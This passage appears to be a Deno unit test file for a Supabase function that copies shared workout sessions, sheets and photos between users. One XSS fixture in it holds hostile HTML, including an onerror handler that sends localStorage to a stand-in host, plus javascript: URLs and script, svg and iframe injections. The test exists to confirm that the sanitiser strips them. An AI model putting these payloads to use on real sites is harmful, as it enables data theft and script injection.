// Unit tests of share's logic with an in-memory store (no network, no Supabase):
//   deno test --no-remote supabase/functions/share/core.test.ts
// (also run by tests/share-function.test.cjs when Deno is installed).
import { mergeWord, planWords } from './words.ts';
import { cleanHtml, freeSlug, handle, rewritePaths, sameExercise, slugStem, STALE_MS, type Recipient, type Row, type Share, type Store, type Theme } from './core.ts';

const eq = (a: unknown, b: unknown, msg = '') => {
  if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(`${msg} expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
};
const ok = (v: unknown, msg: string) => { if (!v) throw new Error(msg); };

const LAU = 'aaaaaaaa-0000-0000-0000-000000000001', LEA = 'bbbbbbbb-0000-0000-0000-000000000002';
const TOK = 'AbCdEfGhIjKlMnOpQrStUv';
const COPY_AT = '2026-11-10T12:00:00.000000+00:00'; // updated_at of a sheet the function inserts
const URL1 = 'https://www.instagram.com/reel/low/', URL2 = 'https://www.tiktok.com/@coach/video/2', URL3 = 'https://youtu.be/teep';

type World = {
  users: Record<string, string>; // jwt -> user id
  shares: Share[];
  sessions: Row[];
  sheets: Row[];
  themes: (Theme & { user_id: string })[];
  files: { name: string; size: number }[];
  notes: { user_id: string; slug: string }[]; // only their keys: share_recipient reads them, the function never does
  quota: Record<string, { max_storage_mb: number; max_sheets: number }>;
  lock?: { message: string; hint: string | null };
  missing?: boolean;           // a backend without the session_shares section
  failSheetInsert?: number;    // the n-th sheet insert raises the sheet quota (as the trigger would)
  raceCopy?: boolean;          // another POST made the copy between our check and our insert
  copyGate?: Promise<void>;    // the next Storage copy waits for this (a copy still on its way)
  failCopy?: boolean;          // Storage copy fails
  dropGate?: Promise<void>;    // the next reservation delete waits for this (a request that observed it, delayed)
  failThemeReadOf?: string;    // reading one of this user's notebooks fails (user_themes down)
  // P11 G5, the glossary: rows of glossary_words and glossary_passes (both empty unless a test fills them). The store
  // below has no way to read or write `passes` (Codex pass 1 on #145): only a test, playing somebody's pass, fills it.
  words: Row[];
  passes: Row[];
  noGlossary?: boolean;        // a backend without the glossary table
  failGlossary?: string;       // every call to the glossary table fails with this code (42501: no right yet)
  meanwhile?: (step: string, uid: string) => void; // somebody else acts: once a glossary read is answered, or just before an entry insert
  failWordInsert?: number;     // the n-th entry insert fails
  raceWord?: Row;              // somebody else inserts this entry just before our next insert
  bumpWord?: Row;              // somebody else adds this item to the entry we are about to update
};
const journal: string[] = [];

function world(): World {
  return {
    users: { 'jwt-lea': LEA, 'jwt-lau': LAU },
    shares: [{ token: TOK, owner: LAU, session_id: 'ses-kicks', sender_name: 'Laurent', revoked_at: null }],
    sessions: [
      { id: 'ses-kicks', user_id: LAU, slug: 'kicks', theme: 'fight', title: 'Kicks du mardi', format: '4 rounds', why: '', key_points: [], source: {}, origin: 'user',
        thumbnail: `${LAU}/teep/img/thumb.jpg`, items: [{ slug: 'low-kick', dose: '3 × 8' }, { slug: 'switch-kick', dose: '3 × 6' }, { slug: 'teep', dose: '2 × 10', rest: 30 }, { slug: 'gone', dose: '1' }] },
      { id: 'ses-lea', user_id: LEA, slug: 'kicks', theme: 'yoga', title: 'Lea own kicks', items: [], source: {} },
    ],
    sheets: [
      { id: 's1', user_id: LAU, slug: 'low-kick', kind: 'sheet', theme: 'fight', group: 'Kicks', title: 'Low kick', html: '<img src="img/01.jpg">', thumbnail: 'img/thumb.jpg', source: { url: URL1, author: '@coach' }, exercises: [], search_text: 'low kick', tags: { zone: ['legs'] } },
      { id: 's2', user_id: LAU, slug: 'switch-kick', kind: 'sheet', theme: 'fight', group: 'Kicks', title: 'Switch kick', html: `<img src="img/01.jpg"><img src="${LAU}/switch-kick/img/02.jpg">`, thumbnail: 'img/thumb.jpg', source: { url: URL2, author: '@kick' }, exercises: [] },
      { id: 's3', user_id: LAU, slug: 'teep', kind: 'sheet', theme: 'fight', group: 'Kicks', title: 'Teep', html: '<p>teep</p>', thumbnail: `${LAU}/teep/img/thumb.jpg`, source: { url: URL3 }, exercises: [{ anchor: 'a', thumbnail: `${LAU}/teep/img/a.jpg` }] },
      // Léa's: the same exercise as Laurent's low kick (same video, same title but for case and spaces: kept), and a
      // sheet already called switch-kick (another video)
      { id: 's4', user_id: LEA, slug: 'my-low-kick', theme: 'yoga', group: 'Legs', title: 'low  Kick', html: 'x', source: { url: URL1 } },
      { id: 's5', user_id: LEA, slug: 'switch-kick', theme: 'yoga', group: 'Legs', title: 'Other', html: 'x', source: { url: 'https://www.instagram.com/reel/other/' } },
    ],
    themes: [
      { user_id: LAU, id: 'fight', title: 'MMA', description: '', groups: ['Kicks'], builtin: true, position: 0 },
      { user_id: LEA, id: 'yoga', title: 'Yoga', position: 0 }, { user_id: LEA, id: 'strength', title: 'Strength', position: 3 },
    ],
    files: [
      { name: `${LAU}/low-kick/img/01.jpg`, size: 100 }, { name: `${LAU}/switch-kick/img/01.jpg`, size: 200 },
      { name: `${LAU}/switch-kick/img/02.jpg`, size: 300 }, { name: `${LAU}/teep/img/thumb.jpg`, size: 50 }, { name: `${LAU}/teep/img/a.jpg`, size: 50 },
      { name: `${LEA}/switch-kick-2/img/old.jpg`, size: 10 }, // an orphan folder of Léa's: switch-kick-2 is taken too
    ],
    notes: [{ user_id: LAU, slug: 'session/kicks' }, { user_id: LAU, slug: 'low-kick' }],
    quota: { [LEA]: { max_storage_mb: 200, max_sheets: 300 } },
    words: [], passes: [],
  };
}

function store(w: World): Store {
  const gone = () => { if (w.missing) throw { code: 'PGRST205', message: "Could not find the table 'public.session_shares'" }; };
  let sheetInserts = 0, wordInserts = 0;
  const log = (s: string) => journal.push(s);
  const glossary = () => {
    if (w.noGlossary) throw { code: 'PGRST205', message: "Could not find the table 'public.glossary_words' in the schema cache" };
    if (w.failGlossary) throw { code: w.failGlossary, message: 'permission denied for table glossary_words' };
  };
  const wkey = (r: Row) => [r.user_id, r.theme, String(r.term).toLowerCase(), String(r.sense ?? '').toLowerCase()].join('|'); // the unique index
  return {
    async user(jwt) { return w.users[jwt] || null; },
    async share(token) { gone(); log('read session_shares'); const s = w.shares.find(x => x.token === token); return s ? { ...s } : null; },
    async session(owner, id) { log('read sessions'); const s = w.sessions.find(x => x.user_id === owner && x.id === id); return s ? structuredClone(s) : null; },
    async sheets(owner, slugs) { log('read sheets'); return w.sheets.filter(x => x.user_id === owner && slugs.includes(String(x.slug))).map(x => structuredClone(x)); },
    async theme(owner, id) { log('read user_themes'); if (owner === w.failThemeReadOf) throw { code: '500', message: 'user_themes down' }; const t = w.themes.find(x => x.user_id === owner && x.id === id); return t ? { ...t } : null; },
    async themes(uid) { log('read user_themes'); return w.themes.filter(x => x.user_id === uid).map(x => ({ ...x })); },
    async copyOf(uid, token) {
      log('read sessions');
      const s = w.sessions.find(x => x.user_id === uid && (x.source as Row || {}).share === token);
      return s ? structuredClone({ id: s.id, slug: s.slug, theme: s.theme, source: s.source, created_at: s.created_at }) : null;
    },
    async copying(uid) {
      log('read sessions');
      const s = w.sessions.find(x => x.user_id === uid && (x.source as Row || {}).share_state === 'copying');
      return s ? structuredClone({ id: s.id, slug: s.slug, theme: s.theme, source: s.source, created_at: s.created_at }) : null;
    },
    // As the SQL of share_recipient: every slug in use that starts with a stem (sheets, storage folders, the notes of
    // sheets; sessions and the notes of sessions, « session/<slug> » or « session/<slug>/<n> »).
    async recipient(uid, urls, stems, sesStem): Promise<Recipient> {
      log('rpc share_recipient');
      const mine = w.sheets.filter(x => x.user_id === uid);
      const folders = w.files.filter(f => f.name.startsWith(uid + '/')).map(f => f.name.split('/')[1]);
      const notes = w.notes.filter(n => n.user_id === uid).map(n => n.slug);
      const starts = (s: string) => stems.some(b => s.startsWith(b));
      const sesNotes = notes.map(n => /^session\/([^/]+)(\/[1-9][0-9]*)?$/.exec(n)).filter(Boolean).map(m => m![1]);
      const used = w.files.filter(f => f.name.startsWith(uid + '/')).reduce((n, f) => n + f.size, 0);
      const q = w.quota[uid];
      return {
        have: mine.filter(x => urls.includes(String((x.source as Row || {}).url))).map(x => ({ url: String((x.source as Row).url), slug: String(x.slug), title: String(x.title) })),
        taken: [...new Set([...mine.map(x => String(x.slug)), ...folders, ...notes.filter(n => !n.includes('/'))].filter(starts))],
        ses_taken: sesStem ? [...new Set([...w.sessions.filter(x => x.user_id === uid).map(x => String(x.slug)), ...sesNotes].filter(s => s.startsWith(sesStem)))] : [],
        room: q ? { storage_bytes: used, max_storage_mb: q.max_storage_mb, sheets: mine.length, max_sheets: q.max_sheets } : null,
        photo_lock: w.lock || null,
      };
    },
    async files(owner, slugs) { log('rpc share_files'); return w.files.filter(f => f.name.startsWith(owner + '/') && slugs.includes(f.name.split('/')[1])).map(f => ({ ...f })); },
    async insertTheme(row) { log('insert user_themes'); w.themes.push(row as Theme & { user_id: string }); },
    async insertSession(row) {
      log('insert sessions');
      if (w.raceCopy) { // the winner finished its copy meanwhile
        w.raceCopy = false;
        w.sessions.push({ ...row, slug: 'kicks-won', source: { ...(row.source as Row), share_state: 'done' }, created_at: new Date().toISOString() });
        throw { code: '23505', message: 'sessions_one_copy_per_share' };
      }
      if (w.sessions.some(x => x.user_id === row.user_id && x.slug === row.slug)) throw { code: '23505', message: 'sessions_user_id_slug_key' };
      if (w.sessions.some(x => x.user_id === row.user_id && (x.source as Row || {}).share && (x.source as Row).share === (row.source as Row).share)) throw { code: '23505', message: 'sessions_one_copy_per_share' };
      // the partial unique index sessions_one_copying: one reservation per user
      if ((row.source as Row || {}).share_state === 'copying' && w.sessions.some(x => x.user_id === row.user_id && (x.source as Row || {}).share_state === 'copying')) throw { code: '23505', message: 'sessions_one_copying' };
      w.sessions.push({ id: crypto.randomUUID(), ...structuredClone(row), created_at: new Date().toISOString() });
    },
    async finishSession(uid, id, patch) {
      log('update sessions');
      const s = w.sessions.find(x => x.user_id === uid && x.id === id && (x.source as Row || {}).share_state === 'copying');
      if (s) Object.assign(s, structuredClone(patch));
      return !!s;
    },
    async dropReservation(uid, id) {
      log('delete sessions');
      if (w.dropGate) { const g = w.dropGate; w.dropGate = undefined; await g; }
      w.sessions = w.sessions.filter(x => !(x.user_id === uid && x.id === id && (x.source as Row || {}).share_state === 'copying'));
    },
    async insertSheet(row) {
      log('insert sheets');
      if (++sheetInserts === w.failSheetInsert) throw { code: 'P0001', message: 'quota: 300 sheets' };
      if (w.sheets.some(x => x.user_id === row.user_id && x.slug === row.slug)) throw { code: '23505', message: 'sheets_user_id_slug_key' };
      w.sheets.push({ ...structuredClone(row), updated_at: COPY_AT }); // the column's default
    },
    async words(uid, themes) {
      glossary(); log('read glossary_words');
      const rows = w.words.filter(x => x.user_id === uid && themes.includes(String(x.theme))).map(x => structuredClone(x));
      w.meanwhile?.('read glossary_words', uid);
      return rows;
    },
    async insertWord(row) {
      glossary(); log('insert glossary_words');
      w.meanwhile?.('insert glossary_words', String(row.user_id));
      if (w.raceWord) { w.words.push(w.raceWord); w.raceWord = undefined; }
      if (++wordInserts === w.failWordInsert) throw { code: '500', message: 'down' };
      if (w.words.some(x => wkey(x) === wkey(row))) throw { code: '23505', message: 'glossary_words_one_entry_ci' };
      w.words.push({ id: crypto.randomUUID(), ...structuredClone(row), updated_at: 'u0' });
    },
    async updateWord(uid, id, seen, patch) {
      glossary(); log('update glossary_words');
      if (w.bumpWord) { const o = w.words.find(x => x.id === id)!; o.sheets = [...(o.sheets as Row[]), w.bumpWord]; o.updated_at = 'bumped'; w.bumpWord = undefined; }
      const r = w.words.find(x => x.user_id === uid && x.id === id && x.updated_at === seen);
      if (r) Object.assign(r, structuredClone(patch), { updated_at: `${r.updated_at}+` }); // the touch trigger
      return !!r;
    },
    // what the store had before Codex pass 2 (delete by slug): kept here only so that the regression tests below fail
    // on that version for the reason they describe
    ...({ async deleteSession(uid: string, slug: string) {
      log('delete sessions');
      if (w.dropGate) { const g = w.dropGate; w.dropGate = undefined; await g; }
      w.sessions = w.sessions.filter(x => !(x.user_id === uid && x.slug === slug));
    } } as Record<string, unknown>),
    async deleteSheets(uid, slugs) { log('delete sheets'); w.sheets = w.sheets.filter(x => !(x.user_id === uid && slugs.includes(String(x.slug)))); },
    async copyFile(from, to) {
      log('storage copy');
      if (w.copyGate) { const g = w.copyGate; w.copyGate = undefined; await g; }
      if (w.failCopy) throw { code: '500', message: 'storage down' };
      ok(to.startsWith(LEA + '/'), `a copy only lands in the caller's folder: ${to}`);
      const f = w.files.find(x => x.name === from); if (!f) throw { code: '404', message: 'Object not found' };
      if (w.files.some(x => x.name === to)) throw { code: '409', message: 'The resource already exists' };
      w.files.push({ name: to, size: f.size });
    },
    async removeFiles(paths) { log('storage remove'); w.files = w.files.filter(f => !paths.includes(f.name)); },
  };
}

const get = (token: string, auth = 'Bearer anon-key') => new Request(`https://fn.example.test/share?token=${encodeURIComponent(token)}`, { headers: { authorization: auth } });
const post = (body: unknown, auth: string | null = 'Bearer jwt-lea') =>
  new Request('https://fn.example.test/share', { method: 'POST', headers: auth ? { authorization: auth } : {}, body: typeof body === 'string' ? body : JSON.stringify(body) });
const call = async (w: World, req: Request) => { const r = await handle(req, store(w)); return { status: r.status, body: await r.json().catch(() => null), headers: r.headers }; };

Deno.test('GET: only the sender, the title, the notebook and the count — no photo, no exercise list', async () => {
  const w = world(), r = await call(w, get(TOK));
  eq(r.status, 200);
  eq(r.body, { sender_name: 'Laurent', title: 'Kicks du mardi', notebook_title: 'MMA', count: 3 }, 'the 3 exercises that still exist');
  const text = JSON.stringify(r.body);
  for (const leak of ['img/', 'jpg', 'Low kick', 'html', LAU, 'thumbnail', '3 × 8']) ok(!text.includes(leak), `GET leaks ${leak}`);
  eq(r.headers.get('access-control-allow-origin'), '*');
});

Deno.test('GET and POST: an unknown, malformed or revoked token is 404', async () => {
  const w = world();
  eq((await call(w, get('ZZZZZZZZZZZZZZZZZZZZZZ'))).status, 404);
  eq((await call(w, get('short'))).body.error, 'not_found');
  w.shares[0].revoked_at = '2026-11-09T10:00:00Z';
  eq((await call(w, get(TOK))).status, 404, 'revoked: GET');
  eq((await call(w, post({ token: TOK }))).status, 404, 'revoked: POST');
  eq(w.sessions.filter(s => s.user_id === LEA).length, 1, 'nothing copied');
});

Deno.test('GET: the sender deleted the session → 404', async () => {
  const w = world(); w.sessions = w.sessions.filter(s => s.user_id !== LAU);
  eq((await call(w, get(TOK))).status, 404);
});

Deno.test('OPTIONS answers the CORS preflight; PUT is refused', async () => {
  const w = world();
  const r = await handle(new Request('https://fn.example.test/share', { method: 'OPTIONS' }), store(w));
  eq(r.status, 200); ok((r.headers.get('access-control-allow-headers') || '').includes('authorization'), 'allow-headers');
  eq((await call(w, new Request('https://fn.example.test/share', { method: 'PUT', body: '{}' }))).status, 405);
});

Deno.test('POST: signed out (anon key) is 401, the sender itself is 409, bad JSON is 400', async () => {
  const w = world();
  eq((await call(w, post({ token: TOK }, 'Bearer anon-key'))).body.error, 'signin');
  eq((await call(w, post({ token: TOK }, null))).status, 401);
  eq((await call(w, post({ token: TOK }, 'Bearer jwt-lau'))).status, 409);
  eq((await call(w, post('not json'))).status, 400);
  eq((await call(w, post('x'.repeat(5000)))).status, 413);
});

Deno.test('POST dry_run: the exercises with dose and credit, which ones the recipient has, the sender notebook — and writes nothing', async () => {
  const w = world(); journal.length = 0;
  const r = await call(w, post({ token: TOK, dry_run: true }));
  eq(r.status, 200);
  eq(r.body.items, [
    { title: 'Low kick', dose: '3 × 8', author: '@coach', have: true, mine: 'low  Kick' },
    { title: 'Switch kick', dose: '3 × 6', author: '@kick', have: false, mine: null },
    { title: 'Teep', dose: '2 × 10', author: '', have: false, mine: null }]);
  eq(r.body.notebook, { id: 'fight', title: 'MMA' }); eq(r.body.count, 3); eq(r.body.copy, null);
  ok(!JSON.stringify(r.body).includes('jpg'), 'no photo in the dry run');
  ok(!journal.some(j => /^(insert|delete|storage)/.test(j)), 'a dry run writes nothing: ' + journal.join(', '));
});

Deno.test('POST: copies the session and the missing sheets, keeps the one Léa has (same video URL), into the sender notebook created for her', async () => {
  const w = world(); journal.length = 0;
  const r = await call(w, post({ token: TOK }));
  eq(r.status, 201);
  eq(r.body.existing, false); eq(r.body.kept, 1); eq(r.body.copied, 2);
  eq(r.body.slug, 'kicks-2', 'Léa already has a session « kicks »: slug collision');
  eq(r.body.notebook, { id: 'fight', title: 'MMA' });
  const nb = w.themes.find(t => t.user_id === LEA && t.id === 'fight');
  ok(nb, 'the notebook is created'); eq([nb!.title, nb!.groups, nb!.builtin, nb!.position], ['MMA', ['Kicks'], true, 4], 'title, groups, colour by id, position after hers');
  const ses = w.sessions.find(s => s.user_id === LEA && s.slug === 'kicks-2')!;
  eq(ses.items, [{ slug: 'my-low-kick', dose: '3 × 8' }, { slug: 'switch-kick-3', dose: '3 × 6' }, { slug: 'teep', dose: '2 × 10', rest: 30 }], 'items rewritten, the missing sheet dropped, extra keys kept');
  eq([ses.origin, ses.theme, (ses.source as Row).share, (ses.source as Row).shared_by], ['user', 'fight', TOK, 'Laurent']);
  eq(ses.thumbnail, `${LEA}/teep/img/thumb.jpg`, 'session thumbnail moved to Léa');
  const mine = w.sheets.filter(s => s.user_id === LEA).map(s => s.slug).sort();
  eq(mine, ['my-low-kick', 'switch-kick', 'switch-kick-3', 'teep'], 'switch-kick and switch-kick-2 (orphan folder) are taken');
  eq(w.sheets.find(s => s.user_id === LEA && s.slug === 'my-low-kick')!.title, 'low  Kick', 'hers is kept as is');
});

Deno.test('POST: photos are copied into the caller folder and their paths rewritten in html, thumbnail and exercises', async () => {
  const w = world();
  await call(w, post({ token: TOK }));
  const sw = w.sheets.find(s => s.user_id === LEA && s.slug === 'switch-kick-3')!, teep = w.sheets.find(s => s.user_id === LEA && s.slug === 'teep')!;
  eq(sw.html, `<img src="img/01.jpg"><img src="${LEA}/switch-kick-3/img/02.jpg">`);
  eq([sw.theme, sw.group, (sw.source as Row).author, sw.kind], ['fight', 'Kicks', '@kick', 'sheet']);
  ok(!('id' in sw) || sw.id !== 's2', 'a new row, not the sender id');
  eq(teep.thumbnail, `${LEA}/teep/img/thumb.jpg`); eq(teep.exercises, [{ anchor: 'a', thumbnail: `${LEA}/teep/img/a.jpg` }]);
  const leaFiles = w.files.filter(f => f.name.startsWith(LEA + '/')).map(f => f.name).sort();
  eq(leaFiles, [`${LEA}/switch-kick-2/img/old.jpg`, `${LEA}/switch-kick-3/img/01.jpg`, `${LEA}/switch-kick-3/img/02.jpg`, `${LEA}/teep/img/a.jpg`, `${LEA}/teep/img/thumb.jpg`]);
  ok(!w.files.some(f => f.name === `${LEA}/low-kick/img/01.jpg`), 'the kept sheet photos are not copied');
  eq(w.files.filter(f => f.name.startsWith(LAU + '/')).length, 5, "the sender's files are untouched");
  const copy = w.sheets.find(s => s.user_id === LEA && s.slug === 'switch-kick-3')!;
  ok(!JSON.stringify(copy).includes(LAU), 'no path of the sender left in the copy');
});

Deno.test('POST: the optional columns (search_text, tags) come along; into one of her own notebooks', async () => {
  const w = world(); w.sheets = w.sheets.filter(s => s.slug !== 'my-low-kick'); // Léa no longer has the low kick
  const r = await call(w, post({ token: TOK, notebook: 'strength' }));
  eq(r.status, 201); eq(r.body.notebook, { id: 'strength', title: 'Strength' });
  ok(!w.themes.some(t => t.user_id === LEA && t.id === 'fight'), 'no notebook created');
  const lk = w.sheets.find(s => s.user_id === LEA && s.slug === 'low-kick')!;
  eq([lk.theme, lk.search_text, lk.tags], ['strength', 'low kick', { zone: ['legs'] }]);
});

Deno.test('POST: a notebook that is neither hers nor the sender one is refused', async () => {
  const w = world();
  eq((await call(w, post({ token: TOK, notebook: 'dance' }))).body.error, 'notebook');
  eq((await call(w, post({ token: TOK, notebook: '../x' }))).status, 400);
});

Deno.test('POST twice, or a copy made meanwhile by a second POST: the first copy comes back (idempotent)', async () => {
  const w = world();
  const a = await call(w, post({ token: TOK }));
  const n = { sheets: w.sheets.length, sessions: w.sessions.length, files: w.files.length };
  const b = await call(w, post({ token: TOK }));
  eq(b.status, 200); eq(b.body, { slug: a.body.slug, notebook: { id: 'fight', title: 'MMA' }, existing: true });
  eq({ sheets: w.sheets.length, sessions: w.sessions.length, files: w.files.length }, n, 'nothing written the second time');
  const d = await call(w, post({ token: TOK, dry_run: true }));
  eq(d.body.copy, { slug: a.body.slug, notebook: 'fight' });

  const w2 = world(); w2.raceCopy = true; journal.length = 0;
  const c = await call(w2, post({ token: TOK }));
  eq([c.status, c.body.slug, c.body.existing], [200, 'kicks-won', true], 'the winner copy');
  ok(!journal.includes('insert sheets') && !journal.includes('storage copy'), 'the loser copies nothing');
});

Deno.test('POST: over the photo quota → 403 with a clear message; no sheet, photo or notebook written, the reservation gone', async () => {
  const w = world(); w.quota[LEA] = { max_storage_mb: 0, max_sheets: 300 }; journal.length = 0;
  const r = await call(w, post({ token: TOK }));
  eq(r.status, 403); eq(r.body.error, 'quota');
  ok(/0 MB of photos/.test(r.body.message) && /Delete sheets/.test(r.body.message), r.body.message);
  ok(!journal.some(j => /^(insert sheets|insert user_themes|storage)/.test(j)), 'no sheet, notebook or photo: ' + journal.join(', '));
  eq(w.sessions.filter(s => s.user_id === LEA).map(s => s.slug), ['kicks'], 'the reservation is deleted');
});

Deno.test('POST: over the sheet quota, or the beta photo lock → 403; nothing written', async () => {
  const w = world(); w.quota[LEA] = { max_storage_mb: 200, max_sheets: 3 };
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.error], [403, 'quota']); ok(/3 sheets/.test(r.body.message), r.body.message);
  const w2 = world(); w2.lock = { message: 'beta: paused', hint: 'New photos are paused on this backend for now. What you have keeps working.' };
  const r2 = await call(w2, post({ token: TOK }));
  eq([r2.status, r2.body.message], [403, w2.lock.hint]);
  eq(w2.sessions.filter(s => s.user_id === LEA).length, 1);
});

Deno.test('POST: the sheet quota trigger refusing mid-copy undoes the session, the sheets and the photos', async () => {
  const w = world(); w.failSheetInsert = 2;
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.error], [403, 'quota']); ok(/300 sheets/.test(r.body.message), r.body.message);
  eq(w.sessions.filter(s => s.user_id === LEA).map(s => s.slug), ['kicks'], 'the claimed session is deleted');
  eq(w.sheets.filter(s => s.user_id === LEA).map(s => s.slug).sort(), ['my-low-kick', 'switch-kick'], 'the sheet copied before is deleted');
  eq(w.files.filter(f => f.name.startsWith(LEA + '/')).map(f => f.name), [`${LEA}/switch-kick-2/img/old.jpg`], 'the photos copied are removed');
});

Deno.test('never notes, practice_log or quotas: the only tables touched are the share, sessions, sheets and notebooks', async () => {
  const w = world(); journal.length = 0;
  await call(w, get(TOK)); await call(w, post({ token: TOK, dry_run: true })); await call(w, post({ token: TOK }));
  const tables = new Set(journal.map(j => j.split(' ').slice(1).join(' ')));
  for (const t of tables) ok(['session_shares', 'sessions', 'sheets', 'user_themes', 'share_recipient', 'share_files', 'copy', 'remove', 'glossary_words'].includes(t), `touched ${t}`);
  const src = await Deno.readTextFile(new URL('./core.ts', import.meta.url)) + await Deno.readTextFile(new URL('./store.ts', import.meta.url)) + await Deno.readTextFile(new URL('./words.ts', import.meta.url));
  for (const t of ["'notes'", "'practice_log'", "'account_quotas'", 'glossary_passes']) ok(!src.includes(t), `the function names ${t}`);
});

Deno.test('a backend without the session_shares section: 503 not_ready, for GET and POST', async () => {
  const w = world(); w.missing = true;
  for (const req of [get(TOK), post({ token: TOK }), post({ token: TOK, dry_run: true })]) {
    const r = await call(w, req);
    eq([r.status, r.body.error, r.body.message], [503, 'not_ready', "This link can't be opened yet."]);
  }
});

Deno.test('freeSlug and rewritePaths', () => {
  eq(freeSlug('a', new Set()), 'a'); eq(freeSlug('a', new Set(['a', 'a-2'])), 'a-3');
  eq(freeSlug('x'.repeat(80), new Set(['x'.repeat(80)])).length, 80);
  eq(rewritePaths('u1/a/img/1.jpg u1/a/x u1/ab/y', 'u1/a/', 'u2/b/'), 'u2/b/img/1.jpg u2/b/x u1/ab/y');
});

// ---------- Codex pass 1 (PR #114): the eight blocking points ----------

const EVIL = '<div class="wrap fiche"><img src="img/01.jpg" onerror="fetch(\'//x.test/\'+localStorage.k)" alt="a"><p onclick="x()">Hi</p>'
  + '<a href="javascript:alert(1)">j</a><a href=" jav&#x09;ascript:alert(1)">t</a><a href="java&Tab;script:alert(1)">e</a><a href="#teep">ok</a>'
  + '<iframe src="https://x.test"></iframe><object data="x"></object><embed src="x"><form action="https://x.test"><input name="p"></form>'
  + '<base href="https://x.test/"><meta http-equiv="refresh" content="0;url=https://x.test"><link rel="stylesheet" href="https://x.test/a.css">'
  + '<script>alert(1)</script><style>body{display:none}</style><svg onload="alert(1)"><script>alert(2)</script></svg>'
  + '<img src="javascript:alert(1)"><img src="https://x.test/pixel.gif"><img src="data:image/svg+xml,<svg onload=alert(1)>"><img src="data:image/png;base64,AAAA">'
  + '<span style="position:fixed" id="view" data-x="1" ONMOUSEOVER="x()">s</span></div>';

Deno.test('1. XSS: a shared sheet loses every handler, script, frame, form, base, meta, link and javascript: or data: URL when copied', async () => {
  const w = world(); w.sheets.find(s => s.slug === 'teep')!.html = EVIL;
  eq((await call(w, post({ token: TOK }))).status, 201);
  const html = String(w.sheets.find(s => s.user_id === LEA && s.slug === 'teep')!.html);
  for (const bad of [/\son[a-z]+\s*=/i, /javascript/i, /<iframe|<object|<embed|<form|<input|<base|<meta|<link|<script|<style|<svg/i, /alert/, /x\.test/, /svg\+xml/, /\sstyle=|\sid=|data-x/])
    ok(!bad.test(html), `${bad} left in ${html}`);
  for (const good of ['<div class="wrap fiche">', '<img src="img/01.jpg" alt="a">', '<p>Hi</p>', '<a href="#teep">ok</a>', '<img src="data:image/png;base64,AAAA">', '<span>s</span>'])
    ok(html.includes(good), `${good} kept in ${html}`);
});

Deno.test('1. cleanHtml keeps what templates/ write (tags, classes, sources, alts, links), and is stable', async () => {
  for (const name of ['sheet.html', 'exercise.html', 'technique.html']) {
    const src = await Deno.readTextFile(new URL(`../../../templates/${name}`, import.meta.url));
    const body = src.replace(/<!--[\s\S]*?-->/g, '');
    const out = cleanHtml(src);
    const tags = (h: string) => [...h.matchAll(/<([a-z][a-z0-9]*)((?:\s+[a-z-]+="[^"]*")*)\s*\/?>/gi)].map(m => m[1].toLowerCase() + m[2].replace(/\s+loading="[^"]*"/, '')).join('|');
    eq(tags(out).replace(/ loading="lazy"/g, ''), tags(body).replace(/ loading="lazy"/g, ''), name);
    eq(out.replace(/\s+/g, ' ').replace(/<[^>]*>/g, ''), body.replace(/\s+/g, ' ').replace(/<[^>]*>/g, ''), `${name}: the text`);
    eq(cleanHtml(out), out, `${name}: cleaning twice changes nothing`);
  }
  eq(cleanHtml('a < b & c <3 <!doctype html><?xml x?><!-- c --><b>x</b'), 'a &lt; b & c &lt;3 <b>x&lt;/b');
  eq(cleanHtml('<p title="a &quot;b&quot; &eacute;" class=\'c "d"\'>x</p>'), '<p title="a &quot;b&quot; &eacute;" class="c &quot;d&quot;">x</p>');
  const raw = cleanHtml('<textarea><img src=x onerror=alert(1)></textarea>ok<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>');
  ok(raw.startsWith('ok') && !/onerror|<textarea|<noscript|<p/.test(raw), raw); // whichever way it is read, no handler comes out
});

Deno.test('2. dedup: three exercises of one video, the recipient has one of them — the other two are copied, each item keeps its sheet', async () => {
  const V = 'https://www.instagram.com/reel/gsp/';
  const w = world();
  w.sessions[0].items = [{ slug: 'session-gsp-angel', dose: '3 × 10' }, { slug: 'session-gsp-bridge', dose: '3 × 12' }, { slug: 'session-gsp-plank', dose: '60 s' }];
  w.sessions[0].thumbnail = '';
  w.sheets.push(...['angel', 'bridge', 'plank'].map((a, i) => ({ id: `g${i}`, user_id: LAU, slug: `session-gsp-${a}`, kind: 'sheet', theme: 'fight', group: 'Floor', title: `Floor ${a}`, html: `<p>${a}</p>`, thumbnail: '', source: { url: V }, exercises: [] })));
  // Léa has the bridge, under her own slug (same title), and a sheet of the same video she renamed but made by rb.py (same slug)
  w.sheets.push({ id: 'l1', user_id: LEA, slug: 'my-bridge', theme: 'yoga', group: 'Legs', title: 'Floor Bridge', html: 'x', source: { url: V } });
  w.sheets.push({ id: 'l2', user_id: LEA, slug: 'session-gsp-plank', theme: 'yoga', group: 'Core', title: 'Ma planche', html: 'x', source: { url: V } });
  const d = await call(w, post({ token: TOK, dry_run: true }));
  eq(d.body.items.map((i: Row) => [i.title, i.have, i.mine]), [['Floor angel', false, null], ['Floor bridge', true, 'Floor Bridge'], ['Floor plank', true, 'Ma planche']]);
  const r = await call(w, post({ token: TOK }));
  eq([r.status, r.body.copied, r.body.kept], [201, 1, 2]);
  const ses = w.sessions.find(s => s.user_id === LEA && (s.source as Row).share === TOK)!;
  eq(ses.items, [{ slug: 'session-gsp-angel', dose: '3 × 10' }, { slug: 'my-bridge', dose: '3 × 12' }, { slug: 'session-gsp-plank', dose: '60 s' }]);
  ok(sameExercise({ url: V, slug: 'a', title: 'X' }, { url: V, slug: 'b', title: ' x ' }) && !sameExercise({ url: V, slug: 'a', title: 'X' }, { url: V, slug: 'b', title: 'Y' }), 'same video and title, or same anchor');
  ok(!sameExercise({ url: '', slug: 'a', title: 'X' }, { url: '', slug: 'a', title: 'X' }), 'no URL: never the same');
});

Deno.test('3. the share is bound to the session id: a new session reusing the slug is not reachable by the old link', async () => {
  const w = world();
  eq((await call(w, get(TOK))).status, 200);
  w.sessions = w.sessions.filter(s => s.id !== 'ses-kicks'); // deleted (the database also deletes the share: on delete cascade)
  w.sessions.push({ id: 'ses-new', user_id: LAU, slug: 'kicks', theme: 'fight', title: 'Private new one', items: [{ slug: 'teep', dose: '' }], source: {} });
  const r = await call(w, get(TOK));
  eq(r.status, 404); ok(!JSON.stringify(r.body).includes('Private'), 'the new session is not shown');
